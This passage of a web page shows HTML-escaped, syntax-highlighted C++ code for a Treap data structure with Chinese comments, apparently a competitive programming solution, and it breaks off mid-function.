class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cstdlib&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;cmath&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;ctime&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; INF=&lt;span class=&#34;number&#34;&gt;1e9&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;randad&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; seed=&lt;span class=&#34;number&#34;&gt;114514&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; seed=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(seed*&lt;span class=&#34;number&#34;&gt;48271LL&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;2147483647&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//48271使得随机数有完全周期，即2147483647内取遍不重复 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; delta=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;node&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; pri,val,ch[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],size,tot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//pri:Treap的随机数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//val:数字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//ch[0,1]:左孩子右孩子&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//size:以该节点为根的子树里有几个数字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//tot:这个数字出现了几次（本题无用）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;T[&lt;span class=&#34;number&#34;&gt;111111&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k,size=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,ANS,ans;&lt;span class=&#34;comment&#34;&gt;//k:根节点，size:树的大小,ANS:临时，ans:赶走了几个人&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k)&lt;/span&gt;&lt;/span&gt;&amp;#123;T[k].size=T[T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]].size+T[T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]].size+T[k].tot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;rturn&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;k)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//右旋，把k旋到右边，k左孩子提到根&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; t=T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=T[t].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    T[t].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=k;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    T[t].size=T[k].size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    k=t;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;lturn&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;k)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//左旋，把k旋到左边，k右孩子提到根&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; t=T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=T[t].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    T[t].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=k;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    T[t].size=T[k].size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    k=t;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ins&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;k,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; val)&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//插入&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (k==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        size++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        k=size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        T[k].pri=&lt;span class=&#34;built_in&#34;&gt;randad&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        T[k].val=val;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        T[k].size=T[k].tot=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    T[k].size++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (T[k].val==val) T[k].tot++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (val&amp;gt;T[k].val) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;ins&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;],val);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (T[T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]].pri&amp;lt;T[k].pri) &lt;span class=&#34;built_in&#34;&gt;lturn&lt;/span&gt;(k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;ins&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],val);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (T[T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]].pri&amp;lt;T[k].pri) &lt;span class=&#34;built_in&#34;&gt;rturn&lt;/span&gt;(k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;del&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;k,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; val)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//删除值为val的数&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (k==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (T[k].val==val) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (T[k].tot&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            T[k].tot--;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            T[k].size--;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;||T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) k=T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]+T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(T[T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]].pri&amp;lt;T[T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]].pri) &lt;span class=&#34;built_in&#34;&gt;rturn&lt;/span&gt;(k),&lt;span class=&#34;built_in&#34;&gt;del&lt;/span&gt;(k,val);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;lturn&lt;/span&gt;(k),&lt;span class=&#34;built_in&#34;&gt;del&lt;/span&gt;(k,val);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(val&amp;gt;T[k].val) T[k].size--,&lt;span class=&#34;built_in&#34;&gt;del&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;],val);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; T[k].size--,&lt;span class=&#34;built_in&#34;&gt;del&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],val);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;xth&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;k,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//查询第x小的数是什么 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(k==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;||x==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x&amp;lt;=T[T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]].size) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;xth&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x&amp;gt;T[T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]].size+T[k].tot) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;xth&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;],x-T[T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]].size-T[k].tot);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; T[k].val;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &amp;amp;k,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//查询第x小数在树中位置 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (k==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;||x==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x&amp;lt;=T[T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]].size)&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x==T[T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]].size+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; k;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;],x-T[T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]].size&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;pre&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//查询不比x大的且最接近x的数所在位置（x前继）&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(k==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(T[k].val&amp;lt;x) ANS=k,&lt;span class=&#34;built_in&#34;&gt;pre&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;],x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;pre&lt;/span&gt;(T[k].ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; 